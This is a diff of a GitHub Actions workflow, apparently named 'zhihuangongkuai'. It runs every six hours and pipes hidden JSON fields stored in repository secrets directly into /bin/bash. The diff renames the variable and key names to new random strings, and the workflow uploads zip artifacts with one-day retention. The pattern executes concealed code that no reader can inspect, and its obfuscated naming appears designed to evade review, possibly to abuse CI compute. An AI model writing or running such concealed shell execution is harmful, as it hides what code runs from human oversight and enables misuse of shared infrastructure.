@@ -1,25 +1,27 @@
 name: zhihuangongkuai
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '9 2/6 * * *'
-jobs:  # 2177
+    - cron: '47 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhihuangongkuai
         env:
-          aqcqc1: ${{ secrets.aqcqc1 }}
+          x1478: ${{ secrets.x1478 }}
         run: |
-          echo $aqcqc1 | jq -r .u3 | /bin/bash
-          echo $ydx98 | jq -r .vxf0 | /bin/bash
-          echo $kofh373 | jq -r .ului13 | /bin/bash
-          echo $qycx86 | jq -r .hs93529 | /bin/bash
-          echo $nop61 | jq -r .shygw6 | /bin/bash
-          echo $l718 | jq -r .wj69311 | /bin/bash
-          echo $qxqzt5551 | jq -r .nva8350 | /bin/bash
-          echo $ggvg662 | jq -r .gnef5261 | /bin/bash
+          printf '%s' "$x1478" | jq -r .qub69236 | /bin/bash
+          echo $gydrz6499 | jq -r .ytrlj83 | /bin/bash
+          echo $aykb2196 | jq -r .zrc1208 | /bin/bash
+          echo $ait9423 | jq -r .yr9145 | /bin/bash
+          echo $vqt9 | jq -r .r38519 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: qjOhJayf
+          path: "*.zip"
+          retention-days: 1
